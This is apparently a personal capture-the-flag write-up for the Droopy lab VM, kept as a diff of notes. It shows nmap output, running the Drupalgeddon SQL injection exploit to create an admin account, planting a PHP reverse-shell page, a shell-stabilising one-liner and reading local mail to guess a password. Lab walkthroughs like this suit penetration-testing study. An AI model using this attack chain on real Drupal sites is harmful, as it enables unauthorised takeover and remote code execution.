@@ -1,0 +1,106 @@
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
+MAC Address: 08:00:27:E8:F6:12 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 199.638 days (since Mon Apr 13 04:30:28 2020)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+
+
+i just remember dc1 has the same output
+so just check the version with changelog
+
+┌─[root@saimson]─[/usr/share/exploitdb]
+└──╼ #searchsploit 34992.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                   | php/webapps/34992.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+┌─[root@saimson]─[/usr/share/exploitdb]
+└──╼ #locate php/webapps/34992.py
+/usr/share/exploitdb/exploits/php/webapps/34992.py
+┌─[root@saimson]─[/usr/share/exploitdb]
+└──╼ #cp /usr/share/exploitdb/exploits/php/webapps/34992.py
+
+then i copied it on workin dir and tried to exploit
+this vulnerability let attacker create admin account on web...
+
+
+┌─[✗]─[root@saimson]─[~/Desktop/.machinenote/droopy]
+└──╼ #python2 34992.py -t http://192.168.56.19 -u saimson -p saimson
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: saimson
+[*] Pass: saimson
+[*] Url: http://192.168.56.19/?q=node&destination=node
+┌─[root@saimson]─[~/Desktop/.machinenote/droopy]
+
+after login my first way always serch for configuration setting allowing php
+so went to module section and allowed phpfilter and change save and then configured
+
+the
+
+You are here
+Home » Administration » Configuration » Content authoring » Text formats
+php code allow insert for administrator use and
+
+then just make a page inserted the monkey.php in body and start listeners on attack box and clicked of priew page .......
+boom i got the shell....let's root it 
+first thing is to convert the shell into stable tty shell
+so i did 
+python -c 'import pty:pty.spawn("/bin/bash");'
+cltr+z
+stty raw -echo
+fg 
+got tty....lel's move further....
+
+got a mail
+
+
+www-data@droopy:/var/mail$ cat www-data 
+From Dave <dave@droopy.example.com> Wed Thu 14 Apr 04:34:39 2016
+Date: 14 Apr 2016 04:34:39 +0100
+From: Dave <dave@droopy.example.com>
+Subject: rockyou with a nice hat!
+Message-ID: <730262568@example.com>
+X-IMAP: 0080081351 0000002016
+Status: NN
+
+George,
+
+   I've updated the encrypted file... You didn't leave any
+hints for me. The password isn't longer than 11 characters
+and anyway, we know what academy we went to, don't you...?
+
+I'm sure you'll figure it out it won't rockyou too much!
+
+If you are still struggling, remember that song by The Jam
+
+Later,
+Dave
+
+i just guess and got the gsuser password....
+it was gsuser
+....
